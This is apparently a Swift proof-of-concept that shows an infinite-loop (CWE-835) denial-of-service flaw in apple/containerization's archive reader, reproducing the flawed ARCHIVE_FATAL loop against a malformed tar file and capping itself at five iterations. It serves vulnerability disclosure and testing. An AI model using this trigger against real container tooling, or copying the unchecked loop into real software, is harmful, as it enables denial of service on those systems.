// ArchiveFatalPoC — demonstrates CWE-835 infinite loop in
// apple/containerization ArchiveReader.extractFile() and
// EXT4.Formatter.unpackEntries() when libarchive returns ARCHIVE_FATAL.
//
// This PoC reproduces the logic WITHOUT importing ContainerizationArchive,
// so it compiles on any macOS with system libarchive (no Xcode 26 / VZ required).
//
// The SAME loop pattern exists verbatim in:
//   Sources/ContainerizationArchive/ArchiveReader.swift:319  (extractFile)
//   Sources/ContainerizationEXT4/Formatter+Unpack.swift:111  (unpackEntries)
//   Sources/ContainerizationEXT4/Formatter+Unpack.swift:91   (scanArchiveHeaders)

#if canImport(Darwin)
import Darwin
#else
import Glibc
#endif

// Minimal libarchive C interface (matches CArchive vendored headers)
typealias ArchivePtr = OpaquePointer

@_silgen_name("archive_read_new")
func archive_read_new() -> ArchivePtr?
@_silgen_name("archive_read_support_filter_all")
func archive_read_support_filter_all(_ a: ArchivePtr?) -> Int32
@_silgen_name("archive_read_support_format_all")
func archive_read_support_format_all(_ a: ArchivePtr?) -> Int32
@_silgen_name("archive_read_open_fd")
func archive_read_open_fd(_ a: ArchivePtr?, _ fd: Int32, _ blockSize: Int) -> Int32
@_silgen_name("archive_entry_new")
func archive_entry_new() -> OpaquePointer?
@_silgen_name("archive_read_next_header2")
func archive_read_next_header2(_ a: ArchivePtr?, _ entry: OpaquePointer?) -> Int32
@_silgen_name("archive_entry_pathname")
func archive_entry_pathname(_ entry: OpaquePointer?) -> UnsafePointer<CChar>?
@_silgen_name("archive_read_free")
func archive_read_free(_ a: ArchivePtr?) -> Int32

let ARCHIVE_EOF:   Int32 = 1
let ARCHIVE_OK:    Int32 = 0
let ARCHIVE_WARN:  Int32 = -20
let ARCHIVE_RETRY: Int32 = -10
let ARCHIVE_FATAL: Int32 = -25

let archivePath = CommandLine.arguments.count > 1
    ? CommandLine.arguments[1]
    : "/tmp/malformed_layer.tar"

print("=== SIG-01 PoC — ARCHIVE_FATAL infinite loop ===")
print("Archive: \(archivePath)")
print()

// ──────────────────────────────────────────────────────────────────────────
// Replicate ArchiveReader.extractFile() loop verbatim (ArchiveReader.swift:319):
//
//   while archive_read_next_header2(self.underlying, entry.underlying) != ARCHIVE_EOF {
//       guard let entryPath = entry.path else { continue }
//       ...
//   }
//
// When archive_read_next_header2 returns ARCHIVE_FATAL:
//   • result (-25) != ARCHIVE_EOF (1) → loop body entered
//   • archive_entry_pathname returns NULL (no path on fatal entry)
//   • Swift guard nil → continue
//   • Loop repeats → ARCHIVE_FATAL again → infinite
// ──────────────────────────────────────────────────────────────────────────

guard let archive = archive_read_new() else {
    print("FAIL: archive_read_new() returned nil"); exit(1)
}
_ = archive_read_support_filter_all(archive)
_ = archive_read_support_format_all(archive)

let fd = open(archivePath, O_RDONLY)
guard fd >= 0 else {
    print("FAIL: cannot open \(archivePath): \(strerror(errno)!)"); exit(1)
}

let openResult = archive_read_open_fd(archive, fd, 4096)
print("archive_read_open_fd result: \(openResult) (expected ARCHIVE_OK=0)")
guard openResult == ARCHIVE_OK else {
    print("FAIL: archive_read_open_fd returned \(openResult)"); exit(1)
}

guard let entry = archive_entry_new() else {
    print("FAIL: archive_entry_new() returned nil"); exit(1)
}

print()
print("Entering while loop (mirrors extractFile()/unpackEntries() logic)...")
print("If the process hangs here → CWE-835 ARCHIVE_FATAL loop confirmed.")
print("Control+C or job timeout = confirmed hang.")
print()

var iteration = 0
while true {
    let result = archive_read_next_header2(archive, entry)
    iteration += 1

    let pathname = archive_entry_pathname(entry)
    let path: String? = pathname.map { String(cString: $0) }

    print("Iteration \(iteration): archive_read_next_header2 = \(result), entry.path = \(path ?? "nil")")

    if result == ARCHIVE_EOF {
        print("→ ARCHIVE_EOF — loop exits normally (control path, no bug)")
        break
    }

    // Mirroring the Swift guard: guard let entryPath = entry.path else { continue }
    guard path != nil else {
        print("→ entry.path is nil (ARCHIVE_FATAL=\(ARCHIVE_FATAL)?) — continue (BUG: loop re-enters)")
        if iteration > 5 {
            print()
            print("CONFIRMED: loop has iterated \(iteration) times without ARCHIVE_EOF")
            print("ARCHIVE_FATAL infinite loop — CWE-835 — confirmed in this environment")
            print("(Terminating PoC after 5 iterations to avoid hanging CI)")
            break
        }
        continue
    }

    // If we somehow get a valid path, check if it matches our target
    print("→ entry.path = \(path!) — searching...")
}

_ = archive_read_free(archive)
close(fd)
print()
print("=== PoC complete ===")
